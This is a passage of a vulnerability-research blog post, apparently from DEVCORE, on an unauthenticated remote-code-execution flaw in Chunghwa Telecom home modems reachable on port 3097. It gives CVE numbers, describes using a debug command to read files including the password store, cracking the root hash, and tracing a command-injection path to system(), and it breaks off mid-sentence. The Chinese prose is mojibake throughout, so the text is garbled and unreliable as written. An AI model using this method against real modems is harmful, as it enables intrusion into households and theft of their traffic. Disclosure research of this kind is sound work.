&lt;p&gt;æŠŠã€Œæ¼æ´ç ”ç©¶ã€ç•¶æˆå·¥ä½œï¼Œä¸€ç›´ä»¥ä¾†æ˜¯è¨±å¤šè³‡è¨Šå®‰å…¨æŠ€è¡“ç‹‚ç†±ä»½å­çš„å¤¢æƒ³ï¼Œä½†å¤§éƒ¨åˆ†çš„äººåªçœ‹åˆ°ç™¼è¡¨æ¼æ´ã€æˆ–ç«™ä¸Šç ”è¨æœƒæ™‚çš„å…‰é®®äº®éº—ï¼Œæ²’æ³¨æ„åˆ°èƒŒå¾Œæ‰€ä¸‹çš„è‹¦å·¥ï¼Œäº‹å¯¦ä¸Šï¼Œã€Œæ¼æ´ç ”ç©¶ã€å¾€å¾€æ˜¯ä¸€å€‹éå¸¸æ¨¸å¯¦ç„¡è¯ï¼Œä¸”æ¯ç‡¥çš„éç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;æ¼æ´æŒ–æ˜ä¸¦ä¸åƒ &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot;&gt;Capture the Flag (CTF)&lt;/a&gt;ï¼Œä¸€å®šå­˜åœ¨è‘—æ¼æ´ä»¥åŠä¸€å€‹æ­£ç¢ºçš„è§£æ³•ç­‰è‘—ä½ å»è§£å‡ºï¼Œåœ¨é¡Œç›®çš„é™å®šç¯„åœä¸‹ï¼Œåªè¦æ ¹æ“šç¾æœ‰çš„æ¢ä»¶ã€ç·šç´¢å»æ¨æ•²å‡ºé¡Œè€…çš„æ„åœ–ï¼Œåä¹‹å…«ä¹å¯ä»¥æ‰¾å‡ºå•é¡Œé»ã€‚ é›–ç„¶é‚„æ˜¯æœ‰é‚£ç¨®æ¸…æ–°ã€å„ªè³ªã€é›£åˆ°é åŒ—çš„æ¯”è³½ä¾‹å¦‚ &lt;a href=&quot;https://ctf.hitcon.org/&quot;&gt;HITCON CTF&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://plaidctf.com/&quot;&gt;Plaid CTF&lt;/a&gt;ï¼Œä¸é ã€Œæ‰¾å‡ºæ¼æ´ã€ èˆ‡ ã€Œå¦‚ä½•åˆ©ç”¨æ¼æ´ã€åœ¨æœ¬è³ªä¸Šå·²ç¶“æ˜¯å…©ä»¶ä¸åŒçš„äº‹æƒ…äº†!&lt;/p&gt;

&lt;p&gt;CTF å¾ˆé©åˆæœ‰ä¸€å®šç¨‹åº¦çš„äººç²¾é€²è‡ªå·±çš„èƒ½åŠ›ï¼Œä½†ç¼ºé»ä¹Ÿæ˜¯å¦‚æœç¶“å¸¸åœ¨é™åˆ¶ä½çš„å°æ¡†æ¡†å…§ï¼Œæ€è·¯åŠçœ¼ç•Œå®¹æ˜“è¢«ä¾·é™ä½ï¼ŒçœŸå¯¦ä¸–ç•Œçš„æ”»é˜²å¾€å¾€æ›´è¤‡é›œã€ç¶­åº¦ä¹Ÿæ›´å¤§! è¦åœ¨ä¸€å€‹æˆç†Ÿã€å·²ä½¿ç”¨å¤šå¹´ï¼Œä¸”å…¨ä¸–ç•Œè³‡å®‰äººå“¡éƒ½åœ¨é—œæ³¨çš„ç”¢å“ä¸ŠæŒ–æ˜å‡ºæ–°å¼±é»ï¼Œå¯æƒ³è€ŒçŸ¥çµ•å°ä¸æ˜¯ç°¡å–®çš„äº‹! ä¸€å ´ CTF ç«¶è³½é ‚å¤šä¹Ÿå°± 48 å°æ™‚ï¼Œä½†åœ¨ç„¡æ³•çŸ¥é“ç›®æ¨™æ˜¯å¦æœ‰æ¼æ´çš„å‰æä¸‹ï¼Œä½ èƒ½å …æŒå¤šä¹…?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;åœ¨æˆ‘å€‘ä¸Šä¸€å€‹ç ”ç©¶ä¸­&lt;/a&gt;ï¼Œç™¼ç¾äº†ä¸‰å€‹çŸ¥å SSL VPN å» å•†ä¸­ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´ï¼Œé›–ç„¶æˆæœè±ç¢©ï¼Œä½†ä¹Ÿæ˜¯èŠ±äº†æ•´å€‹ç ”ç©¶çµ„åŠå¹´çš„æ™‚é–“(åŠ ä¸Šå¾ŒçºŒè™•ç†ç”šè‡³å¯åˆ°ä¸€å¹´)ï¼Œç”šè‡³åœ¨å‰å…©å€‹æœˆå®Œå…¨æ˜¯é›¶ç”¢å‡ºã€æ‰¾ä¸åˆ°æ¼æ´ä¸‹æŒçºŒå®Œæˆçš„ã€‚ æ‰€ä»¥å°æ–¼ä¸€å€‹å¥½çš„æ¼æ´ç ”ç©¶äººå“¡ï¼Œé™¤äº†ç¶œåˆèƒ½åŠ›ã€è¦‹è­˜å¤šå¯¡ä»¥åŠèƒ½å¦æ·±åº¦æŒ–æ˜å¤–ï¼Œé‚„éœ€è¦å…·å‚™èƒ½å¤ ç¨ç«‹æ€è€ƒï¼Œä»¥åŠèˆˆè¶£æ¿ƒåšåˆ°è€å¾—ä½å¯‚å¯ç­‰ç­‰ç‰¹è³ªï¼Œæ‰æœ‰è¾¦æ³•åœ¨é«˜é›£åº¦çš„æŒ‘æˆ°ä¸­æ®ºå‡ºä¸€æ¢è¡€è·¯!&lt;/p&gt;

&lt;p&gt;æ¼æ´ç ”ç©¶å¾€å¾€ä¸æ˜¯ä¸€é–“å…¬å¸è³ºéŒ¢çš„é …ç›®ï¼Œå»åˆæ˜¯ç„¡æ³•ä¸æŠ•è³‡çš„éƒ¨é–€ï¼Œæœ‰å¤šå°‘å…¬å¸èƒ½å¤ å…è¨±å“¡å·¥åŠå¹´ã€ç”šè‡³ä¸€å¹´å»åšä¸€ä»¶ä¸ä¸€å®šæœ‰ç”¢å‡ºçš„ç ”ç©¶? æ›´ä½•æ³æ˜¯å°‡ç ”ç©¶æˆæœç„¡æ¢ä»¶çš„å›å ±å» å•†åªæ˜¯ç‚ºäº†è®“ä¸–ç•Œæ›´åŠ å®‰å…¨? é€™ä¹Ÿå°±æ˜¯æˆ‘å€‘ DEVCORE ä¸è«–åœ¨&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æˆ–æ˜¯&lt;a href=&quot;https://devco.re/services/red-team/&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;ä¸Šæ¯”åˆ¥äººä¾†çš„å„ªç§€çš„ç·£æ•…ï¼Œé™¤äº†å¹³æ—¥è»ç«åº«çš„ç´¯ç©å¤–ï¼Œç•¶é‡åˆ°æ¼æ´æ™‚ï¼Œä¹Ÿæœƒæƒ³ç›¡è¾¦æ³•å°‡é€™å€‹æ¼æ´çš„å±å®³æœ€å¤§åŒ–ï¼Œåˆ©ç”¨é§­å®¢æ€ç¶­ã€é€éå„ç¨®ä¸åŒçµ„åˆåˆ©ç”¨ï¼Œå°‡ä¸€å€‹ä½é¢¨éšªæ¼æ´åˆ©ç”¨åˆ°æ¥µè‡´ï¼Œé€™ä¹Ÿæ‰ç¬¦åˆçœŸå¯¦ä¸–ç•Œé§­å®¢å°ä½ çš„æ”»æ“Šæ–¹å¼!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å½±éŸ¿ç¯„åœ&quot;&gt;å½±éŸ¿ç¯„åœ&lt;/h2&gt;

&lt;p&gt;æ•…äº‹å›åˆ°ä»Šå¹´åˆçš„æŸå¤©ï¼Œæˆ‘å€‘ DEVCORE çš„æƒ…è³‡ä¸­å¿ƒç›£æ§åˆ°å…¨å°ç£æœ‰å¤§é‡çš„ç¶²è·¯åœ°å€é–‹è‘— 3097 é€£æ¥åŸ ï¼Œè€Œä¸”æœ‰è¶£çš„æ˜¯ï¼Œé€™äº›åœ°å€ä¸¦ä¸æ˜¯ä»€éº¼ä¼ºæœå™¨çš„åœ°å€ï¼Œè€Œæ˜¯æ™®é€šçš„å®¶ç”¨é›»è…¦ã€‚ ä¸€èˆ¬ä¾†èªªï¼Œå®¶ç”¨é›»è…¦é€éæ•¸æ“šæ©Ÿé€£æ¥ä¸Šç¶²éš›ç¶²è·¯ï¼Œå°å¤–çµ•ä¸æœƒé–‹æ”¾ä»»ä½•æœå‹™ï¼Œå°±ç®—æ˜¯æ•¸æ“šæ©Ÿçš„ SSH åŠ HTTP ç®¡ç†ä»‹é¢ï¼Œä¹Ÿåªæœ‰å…§éƒ¨ç¶²è·¯æ‰èƒ½è¨ªå•åˆ°ï¼Œå› æ­¤æˆ‘å€‘æ‡·ç–‘é€™èˆ‡ ISP çš„é…ç½®å¤±èª¤æœ‰é—œ! æˆ‘å€‘ä¹ŸæˆåŠŸçš„åœ¨é€™å€‹é€£æ¥åŸ ä¸ŠæŒ–æ˜å‡ºä¸€å€‹ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´! æ‰“å€‹æ¯”å–»ï¼Œå°±æ˜¯é§­å®¢å·²ç¶“ç¡åœ¨ä½ å®¶å®¢å»³æ²™ç™¼çš„æ„Ÿè¦º!&lt;/p&gt;

&lt;p&gt;é€éé€™å€‹æ¼æ´æˆ‘å€‘å¯ä»¥å®Œæˆ:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç«Šè½ç¶²è·¯æµé‡ï¼Œç«Šå–ç¶²è·¯èº«åˆ†ã€PTT å¯†ç¢¼ï¼Œç”šè‡³ä½ çš„ä¿¡ç”¨å¡è³‡æ–™&lt;/li&gt;
  &lt;li&gt;æ›´æ–°åŠ«æŒã€æ°´å‘å¼æ”»æ“Šã€å…§ç¶²ä¸­ç¹¼æ”»æ“Šå»æ§åˆ¶ä½ çš„é›»è…¦ç”šè‡³å€‹äººæ‰‹æ©Ÿ&lt;/li&gt;
  &lt;li&gt;çµåˆç´…éšŠæ¼”ç·´å»ç¹éå„ç¨®é–‹ç™¼è€…çš„ç™½åå–®æ”¿ç­–&lt;/li&gt;
  &lt;li&gt;æ›´å¤šæ›´å¤šâ€¦&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è€Œç›¸é—œçš„ CVE æ¼æ´ç·¨è™Ÿç‚º:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411&quot;&gt;CVE-2019-13411&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412&quot;&gt;CVE-2019-13412&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064&quot;&gt;CVE-2019-15064&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065&quot;&gt;CVE-2019-15065&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066&quot;&gt;CVE-2019-15066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç›¸è¼ƒæ–¼ä»¥å¾€å°å®¶ç”¨æ•¸æ“šæ©Ÿçš„æ”»æ“Šï¼Œé€™æ¬¡çš„å½±éŸ¿æ˜¯æ›´åš´é‡çš„! ä»¥å¾€å°±ç®—æ¼æ´å†åš´é‡ï¼Œåªè¦å®¶ç”¨æ•¸æ“šæ©Ÿå°å¤–ä¸é–‹æ”¾ä»»ä½•é€£æ¥åŸ ï¼Œæ”»æ“Šè€…ä¹Ÿç„¡æ³•åˆ©ç”¨ï¼Œä½†é€™æ¬¡çš„æ¼æ´åŒ…å«ä¸­è¯é›»ä¿¡çš„é…ç½®å¤±èª¤ï¼Œå°è‡´ä½ å®¶çš„æ•¸æ“šæ©Ÿåœ¨ç¶²è·¯ä¸Šè£¸å¥”ï¼Œæ”»æ“Šè€…åƒ…åƒ… &lt;strong&gt;ã€Œåªè¦çŸ¥é“ä½ çš„ IP ä¾¿å¯ä¸éœ€ä»»ä½•æ¢ä»¶ï¼Œç›´æ¥é€²å…¥ä½ å®¶å…§ç¶²ã€&lt;/strong&gt;ï¼Œè€Œä¸”ï¼Œç”±æ–¼æ²’æœ‰æ•¸æ“šæ©Ÿçš„æ§åˆ¶æ¬Šï¼Œæ‰€ä»¥é€™å€‹æ”»æ“Šä¸€èˆ¬ç”¨æˆ¶æ˜¯ç„¡æ³•é˜²ç¦¦åŠä¿®è£œçš„!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç¶“éå…¨ç¶² IPv4 çš„æƒç„ï¼Œå…¨å°ç£ç´„æœ‰ 25 è¬å°çš„æ•¸æ“šæ©Ÿå­˜åœ¨æ­¤å•é¡Œï¼Œ&lt;strong&gt;ã€Œä»£è¡¨è‡³å°‘ 25 è¬å€‹å®¶åº­å—å½±éŸ¿ã€&lt;/strong&gt;ï¼Œä¸éé€™å€‹çµæœåªåœ¨ &lt;strong&gt;ã€Œæƒæç•¶ä¸‹æœ‰é€£ä¸Šç¶²è·¯çš„æ•¸æ“šæ©Ÿæ‰è¢«ç´å…¥çµ±è¨ˆã€&lt;/strong&gt;ï¼Œæ‰€ä»¥å¯¦éš›å—å®³ç”¨æˆ¶ä¸€å®šå¤§æ–¼é€™å€‹æ•¸å­—!&lt;/p&gt;

&lt;p&gt;è€Œé€éç¶²è·¯åœ°å€çš„åæŸ¥ï¼Œæœ‰é«˜é”ä¹æˆçš„å—å®³ç”¨æˆ¶æ˜¯ä¸­è¯é›»ä¿¡çš„å‹•æ…‹ IPï¼Œè€Œå‰©ä¸‹çš„ä¸€æˆå‰‡åŒ…å«å›ºå®šåˆ¶ IP åŠå…¶ä»–é›»ä¿¡å…¬å¸ï¼Œè‡³æ–¼ç‚ºä½•æœƒæœ‰å…¶ä»–é›»ä¿¡å…¬å¸å‘¢? æˆ‘å€‘çš„ç†è§£æ˜¯ä¸­è¯é›»ä¿¡ä½œç‚ºå°ç£æœ€å¤§é›»ä¿¡å•†ï¼Œæ‰€æŒæœ‰çš„è³‡æºä»¥åŠç¡¬é«”è¨­æ–½ä¹Ÿæ˜¯å…¶ä»–é›»ä¿¡å•†é é ä¸åŠçš„ï¼Œå› æ­¤åœ¨ä¸€äº›æ¯”è¼ƒååƒ»çš„åœ°æ®µå¯èƒ½å…¶ä»–é›»ä¿¡å•†åˆ°ä½¿ç”¨è€…çš„æœ€å¾Œä¸€å“©è·¯ä¹Ÿé‚„æ˜¯ä¸­è¯é›»ä¿¡çš„è¨­å‚™! ç”±æ–¼æˆ‘å€‘ä¸æ˜¯å» å•†ï¼Œç„¡æ³•å¾—çŸ¥å®Œæ•´å—å½±éŸ¿çš„æ•¸æ“šæ©Ÿå‹è™Ÿåˆ—è¡¨ï¼Œä½†ç­†è€…ä¹Ÿæ˜¯å—å®³è€… â•®(â•¯_â•°)â•­ï¼Œæ‰€ä»¥å¯ä»¥ç¢ºå®šæœ€å¤šäººä½¿ç”¨çš„&lt;a href=&quot;https://broadband.hinet.net/rate.do&quot;&gt;ä¸­è¯é›»ä¿¡å…‰ä¸–ä»£ GPON æ•¸æ“šæ©Ÿ&lt;/a&gt; ä¹Ÿåœ¨å—å½±éŸ¿ç¯„åœå…§!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/1.png&quot; alt=&quot;&quot; /&gt;
(&lt;a href=&quot;https://www.hungry.tw/2014/12/MiWifi.html&quot;&gt;åœ–ç‰‡æ“·è‡ªç¶²è·¯&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´æŒ–æ˜&quot;&gt;æ¼æ´æŒ–æ˜&lt;/h2&gt;

&lt;p&gt;åªæ˜¯ä¸€å€‹é…ç½®å¤±èª¤ä¸¦ä¸èƒ½èªªæ˜¯ä»€éº¼å¤§å•é¡Œï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘å¸Œæœ›èƒ½åœ¨é€™å€‹æœå‹™ä¸ŠæŒ–æ˜å‡ºæ›´åš´é‡çš„æ¼æ´! è»Ÿé«”æ¼æ´çš„æŒ–æ˜ï¼Œæ ¹æ“šåŸå§‹ç¢¼ã€åŸ·è¡Œæª”ä»¥åŠ API æ–‡ä»¶çš„æœ‰ç„¡å¯ä¾åºåˆ†ç‚º:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;é»‘ç®±æ¸¬è©¦&lt;/li&gt;
  &lt;li&gt;ç°ç®±æ¸¬è©¦&lt;/li&gt;
  &lt;li&gt;ç™½ç®±æ¸¬è©¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ä»€éº¼éƒ½æ²’æœ‰çš„çš„ç‹€æ³ä¸‹ï¼Œåªèƒ½ä¾é ç¶“é©—ä»¥åŠå°ç³»çµ±çš„äº†è§£å»çŒœæ¸¬æ¯å€‹æŒ‡ä»¤èƒŒå¾Œçš„å¯¦ä½œã€ä¸¦æ‰¾å‡ºæ¼æ´ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é»‘ç®±æ¸¬è©¦&quot;&gt;é»‘ç®±æ¸¬è©¦&lt;/h3&gt;

&lt;p&gt;3097 é€£æ¥åŸ æä¾›äº†è¨±å¤šè·Ÿé›»ä¿¡ç¶²è·¯ç›¸é—œçš„æŒ‡ä»¤ï¼Œæ¨æ¸¬æ˜¯ä¸­è¯é›»ä¿¡çµ¦å·¥ç¨‹å¸«é ç«¯å°æ•¸æ“šæ©Ÿé€²è¡Œå„ç¨®ç¶²è·¯è¨­å®šçš„é™¤éŒ¯ä»‹é¢!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ï¼Œå¯ä»¥é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; æŒ‡ä»¤åˆ—å‡ºæ‰€æœ‰åŠŸèƒ½ï¼Œå…¶ä¸­æˆ‘å€‘ç™¼ç¾äº†ä¸€å€‹æŒ‡ä»¤å«åš &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC&lt;/code&gt; ï¼Œçœ‹åå­—æ„Ÿè¦ºå°±æ˜¯æŠŠä¸€å †ä¸çŸ¥é“æ€éº¼åˆ†é¡çš„æŒ‡ä»¤æ­¸é¡åœ¨é€™ï¼Œè€Œå…¶ä¸­ä¸€å€‹å«åš &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCRIPT&lt;/code&gt; å¸å¼•äº†æˆ‘å€‘! å®ƒçš„åƒæ•¸ç‚ºä¸€å€‹æª”æ¡ˆåç¨±ï¼ŒåŸ·è¡Œå¾Œåƒæ˜¯æœƒæŠŠæª”æ¡ˆç•¶æˆ Shell Script ä¾†åŸ·è¡Œï¼Œä½†åœ¨ç„¡æ³•åœ¨é ç«¯æ©Ÿå™¨ç•™ä¸‹ä¸€å€‹å¯æ§æª”æ¡ˆçš„å‰æä¸‹ï¼Œä¹Ÿç„¡æ³•é€éé€™å€‹æŒ‡ä»¤å–å¾—ä»»æ„ä»£ç¢¼åŸ·è¡Œã€‚ ä¸éæœ‰è¶£çš„æ˜¯ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC SCRIPT&lt;/code&gt; é€™å€‹æŒ‡ä»¤æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; çµ¦é¡¯ç¤ºå‡ºä¾†ï¼Œå› æ­¤å¯ä»¥é€éé€™å€‹ç‰¹æ€§å»å®Œæˆä»»æ„æª”æ¡ˆè®€å–!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾é»‘ç®±é€²åŒ–æˆç°ç®±&quot;&gt;å¾é»‘ç®±é€²åŒ–æˆç°ç®±&lt;/h3&gt;

&lt;p&gt;åœ¨æ¼æ´çš„åˆ©ç”¨ä¸Šï¼Œç„¡è«–æ˜¯è¨˜æ†¶é«”çš„åˆ©ç”¨ã€æˆ–æ˜¯ç¶²è·¯çš„æ»²é€ï¼Œä¸å¤–ä¹éƒ½åœç¹è‘—å°ç›®æ¨™çš„è®€(Read)ã€ å¯«(Write) ä»¥åŠä»£ç¢¼åŸ·è¡Œ(eXecute) ä¸‰å€‹æ¬Šé™çš„å–å¾—ï¼Œç¾åœ¨æˆ‘å€‘å–å¾—äº†ç¬¬ä¸€å€‹è®€çš„æ¬Šé™ï¼Œæ¥ä¸‹ä¾†å‘¢?&lt;/p&gt;

&lt;p&gt;é™¤éŒ¯ä»‹é¢è²Œä¼¼è·‘åœ¨é«˜æ¬Šé™ä½¿ç”¨è€…ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€éè®€å–ç³»çµ±å¯†ç¢¼æª”å¾—åˆ°ç³»çµ±ä½¿ç”¨è€…ç®¡ç†ç™»å…¥çš„å¯†ç¢¼é›œæ¹Š!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€éå° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; ä½¿ç”¨è€…å¯†ç¢¼é›œæ¹Šçš„ç ´è§£ï¼Œæˆ‘å€‘æˆåŠŸçš„ç™»å…¥æ•¸æ“šæ©Ÿ SSH å°‡ã€Œé»‘ç®±ã€è½‰åŒ–æˆã€Œç°ç®±ã€! é›–ç„¶ç¾åœ¨å¯ä»¥æˆåŠŸæ§åˆ¶è‡ªå·±çš„æ•¸æ“šæ©Ÿï¼Œä½†ä¸€èˆ¬å®¶ç”¨æ•¸æ“šæ©Ÿå°å¤–æ˜¯ä¸æœƒé–‹æ”¾ SSH æœå‹™çš„ï¼Œç‚ºäº†é”åˆ°å¯ä»¥ã€Œé ç«¯ã€æ§åˆ¶åˆ¥äººçš„æ•¸æ“šæ©Ÿï¼Œæˆ‘å€‘é‚„æ˜¯å¾—æƒ³è¾¦æ³•å¾ 3097 é€™å€‹æœå‹™æ‹¿åˆ°ä»£ç¢¼çš„åŸ·è¡Œæ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ•´å€‹ä¸­è¯é›»ä¿¡çš„æ•¸æ“šæ©Ÿæ˜¯ä¸€å€‹è·‘åœ¨ MIPS è™•ç†å™¨æ¶æ§‹ä¸Šçš„åµŒå…¥å¼ Linux ç³»çµ±ï¼Œè€Œ 3097 æœå‹™å‰‡æ˜¯ç”±ä¸€å€‹åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/omcimain&lt;/code&gt; çš„äºŒé€²ä½æª”æ¡ˆä¾†è™•ç†ï¼Œæ•´å€‹æª”æ¡ˆå¤§å°æœ‰å°‡è¿‘ 5MBï¼Œå°é€†å‘å·¥ç¨‹ä¾†èªªä¸¦ä¸æ˜¯ä¸€å€‹å°æ•¸ç›®ï¼Œä½†èˆ‡é»‘ç®±æ¸¬è©¦ç›¸è¼ƒä¹‹ä¸‹ï¼Œè‡³å°‘æœ‰äº†æ±è¥¿å¯ä»¥åˆ†æäº†çœŸæ£’!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¾ç°ç®±é€²åŒ–æˆç™½ç®±&quot;&gt;å¾ç°ç®±é€²åŒ–æˆç™½ç®±&lt;/h3&gt;

&lt;p&gt;ç¾åœ¨ï¼Œæˆ‘å€‘å¯ä»¥é€éé€†å‘å·¥ç¨‹äº†è§£æ¯å€‹æŒ‡ä»¤èƒŒå¾Œçš„åŸç†åŠå¯¦ä½œäº†! ä¸éé¦–å…ˆï¼Œé€†å‘å·¥ç¨‹æ˜¯ä¸€å€‹ç—›è‹¦ä¸”ç…©æ‚¶çš„ç¶“éï¼Œä¸€å€‹å°å°çš„ç¨‹å¼å¯èƒ½å°±åŒ…å«å¹¾è¬ã€ç”šè‡³åå¹¾è¬è¡Œçš„çµ„åˆèªè¨€ä»£ç¢¼ï¼Œå› æ­¤é€™æ™‚æŒ–æ´çš„ç­–ç•¥å°±è®Šå¾—å¾ˆé‡è¦! å¾åŠŸèƒ½é¢ä¾†çœ‹ï¼Œæ„Ÿè¦ºæœƒå­˜åœ¨å‘½ä»¤æ³¨å…¥ç›¸é—œçš„æ¼æ´ï¼Œå› æ­¤å…ˆä»¥åŠŸèƒ½å¯¦ä½œç‚ºå‡ºç™¼é»é–‹å§‹æŒ–æ˜!&lt;/p&gt;

&lt;p&gt;æ•´å€‹ 3097 æœå‹™çš„è™•ç†æ ¸å¿ƒå…¶å¯¦å°±æ˜¯ä¸€å€‹å¤šå±¤çš„ IF-ELSE é¸é …ï¼Œæ¯ä¸€å€‹å°æ¡†æ¡†å°æ‡‰çš„ä¸€å€‹åŠŸèƒ½çš„å¯¦ä½œï¼Œä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cli_config_cmdline&lt;/code&gt; å°±æ˜¯å°æ‡‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONFIG&lt;/code&gt; é€™æ¢æŒ‡ä»¤ï¼Œå› æ­¤æˆ‘å€‘æ­é…è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; æŒ‡ä»¤çš„æç¤ºä¸€ä¸€å¾€æ¯å€‹åŠŸèƒ½å¯¦ä½œæŒ–æ˜!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç ”ç©¶äº†ä¸€æ®µæ™‚é–“ï¼Œä¸¦æ²’æœ‰ç™¼ç¾åˆ°ä»€éº¼åš´é‡æ¼æ´ :( ä¸éæˆ‘å€‘æ³¨æ„åˆ°ï¼Œç•¶æ‰€æœ‰æŒ‡å‘½éƒ½åŒ¹é…å¤±æ•—æ™‚ï¼Œæœƒé€²å…¥åˆ°äº†ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; çš„å‡½æ•¸ï¼Œé€™å€‹å‡½æ•¸çš„ä¸»è¦ç›®çš„æ˜¯æŠŠåŒ¹é…å¤±æ•—çš„æŒ‡ä»¤æ¥åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; å¾Œç¹¼çºŒåŸ·è¡Œ!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; å¤§è‡´é‚è¼¯å¦‚ä¸‹ï¼Œç”±æ–¼ç•¶æ™‚ Ghidra å°šæœªå‡ºç¾ï¼Œæ‰€ä»¥é€™ä»½åŸå§‹ç¢¼æ˜¯å¾é–±è®€ MIPS çµ„åˆèªè¨€æ…¢æ…¢é‚„åŸå›ä¾†çš„! å…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt; ç‚ºè¼¸å…¥çš„æŒ‡ä»¤ï¼Œå¦‚æœæŒ‡ä»¤ä¸åœ¨å®šç¾©å¥½çš„åˆ—è¡¨å…§ä»¥åŠæŒ‡ä»¤ä¸­å‡ºç¾å•è™Ÿçš„è©±ï¼Œå°±èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; æ‹¼æ¹Šèµ·ä¾†ä¸Ÿå…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; åŸ·è¡Œ! ç†æ‰€ç•¶ç„¶ï¼Œç‚ºäº†é˜²æ­¢å‘½ä»¤æ³¨å…¥ç­‰ç›¸é—œå¼±é»ï¼Œåœ¨ä¸Ÿå…¥ &lt;code class=&quot;language-plaintext 